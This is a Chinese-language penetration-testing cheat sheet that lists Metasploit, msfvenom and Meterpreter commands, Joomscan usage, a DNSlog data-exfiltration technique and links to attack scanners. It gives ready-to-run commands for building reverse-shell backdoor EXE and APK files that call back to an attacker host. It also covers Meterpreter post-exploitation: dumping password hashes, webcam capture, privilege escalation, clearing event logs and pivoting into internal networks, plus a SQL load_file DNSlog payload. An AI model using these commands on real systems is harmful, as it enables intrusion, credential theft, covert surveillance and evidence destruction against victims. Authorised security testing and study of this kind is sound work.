综合框架
----------------------------------------

metasploit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Terminal下msf常用命令简介
	+ msf数据库初始化
		``msfdb init``
	+ msf更新
		``apt install metasploit framework``
	+ 多平台攻击载荷生成器
		``msfvenom``
	+ 将汇编指令转换成为对应的16进制机器码
		``msf-nasm_shell``
	+ 打开msf终端
		``msfconsole``
- msf终端下常用命令简介
	+ 查看数msf据库连接状态,连接数据库能够优化搜索等过程
		``db_status`` 
	+ 重建缓存，将模块等索引重新存入数据库
		``db_rebuild_cache``
	+ 调用nmap扫描，并将扫描结果存入数据库
		``db_nmap``
	+ 显示命令的帮助信息
		``help [db_connect]``
	+ 搜索含有关键字的模块
		``search [module]``
	+ 选择模块
		``use [module]``
	+ 显示该模块支持的payload
		``show payload``
	+ 显示该模块需要设置的参数(其中required为no的表示不是必须的参数)
		``show options``
	+ 如果觉得show命令显示的不够完整可以直接输入info查看详细详细
		``info``
	+ 使用模块后，设置模块所需要的参数的值(对应使用unset取消设置的值)
		``set [opt]``
	+ 设置全局参数，对于ip之类的参数可以设置为全局，当切换模块后就不需要再次设置ip参数(对应使用unsetg取消设置)
		``setg [opt]``
	+ 返回上级状态
		``back``
	+ 两个命令都表示运行攻击模块
		``exploit/run``
	+ 查看当前连接的会话
		``sessions``
- 使用msfvenom生成木马文件
	+ 查看可使用的载荷/编码器/nops/所有列表
		``msfvenom -l payload/encoders/nops/all``
	+ 生成exe木马
		``msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.16.99 lport=4444 -a x64 -f exe -o backdoor_raw.exe`` 
	+ 生成apk木马
		``msfvenom -p android/meterpreter_reverse_tcp lhost=192.168.16.99 lport=4444 -o backdoor_raw.apk``
- meterpreter后渗透利用
	+ 打印当前工作目录：pwd
	+ 查看系统信息：sysinfo
	+ 查看当前目标机上运行的进程列表和pid：ps
	+ 调用相机拍摄照片：webcam_snap
	+ 运行vnc远程查看屏幕：run vnc
	+ 远程桌面3389（windows）：run post/windows/manage/enable_rdp
	+ 截取目标主机当前屏幕​：screenshot
	+ 获取当前权限的用户id：getuid
	+ 获取system权限：getsystem
	+ 获取用户名与hash口令：hashdump
	+ 获取目标主机shell(windows环境下中文乱码的解决办法:chcp 65001）：shell
	+ 退出shell模式，返回到meterpreter：Ctrl+Z
	+ 上传一个文件：upload
	+ 下载一个文件：download
	+ 执行目标系统中的文件(-f 指定文件，-i执行可交互模式，-H隐藏窗口)：excute
	+ 清除日志：clearev
	+ 将Meterpreter放入后台(使用session -i重新连接到会话)：background
- meterpreter内网渗透
	+ 获取目标主机上的子网状态：run get_local_subnets
	+ 使用autoroute模块添加到达内网的路由经session 1转发：run autoroute -s 169.254.0.0/16 1
	+ 查看当前的路由表：run autoroute -p
	+ 扫描内网存活主机：db_nmap
	+ 将目标主机192.168.16.59的3389转发到本地主机的7070端口：portfwd add -l 7070 -r 192.168.16.59 -p 3389
	+ 端口转发成功后就可以从本地端口连接rdp：rdesktop 127.0.0.1:7070

Joomscan
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 介绍
	+ Joomla security scanner可以检测Joomla整站程序搭建的网站是否存在文件包含、sql注入、命令执行等漏洞。
- 使用方法
	+ 默认检测：``joomscan -u www.example.com``
	+ 组件检测：``joomscan -u www.example.com –ec``
	+ 设置cookie：``joomscan -u www.example.com --cookie "test=demo;"``
	+ 随机UA：``joomscan -u www.example.com -r``
	+ 设置代理：``joomscan -u www.example.com --proxy http://127.0.0.1:8080``
	
dnslog
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 利用场景
	+ Sql-Blind
	+ RCE
	+ SSRF
	+ RFI（Remote File Inclusion）
- 原理
	将dnslog平台中的特有字段payload带入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在ns服务器的dns日志中显示出来。
- 限制
	load_file函数在Linux下是无法用来做dnslog攻击的，因为Linux没有UNC路径(UNC路径就是类似\\softer这样的形式的网络路径)。
- 示例
	+ ``select load_file('\\\\',version(),'.dnslog地址')``

其它
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- AWVS
- openvas
- nessus
- `PenTesters Framework(ptf) <https://github.com/trustedsec/ptf>`_
- katoolin
- `w3af <http://w3af.org/>`_
- `AutoSploit <https://github.com/NullArray/AutoSploit/>`_
- `skipfish <https://my.oschina.net/u/995648/blog/114321>`_
- `Arachni <http://www.arachni-scanner.com/>`_
- `Spiderfoot <https://github.com/smicallef/spiderfoot>`_
- `AZScanner <https://github.com/az0ne/AZScanner>`_
- `Fuxi <https://github.com/jeffzh3ng/Fuxi-Scanner>`_
- `vooki <https://www.vegabird.com/vooki/>`_
- `BadMod <https://github.com/MrSqar-Ye/BadMod>`_
- `xray <https://github.com/chaitin/xray>`_
- `x-scan <https://x-scan.apponic.com/>`_
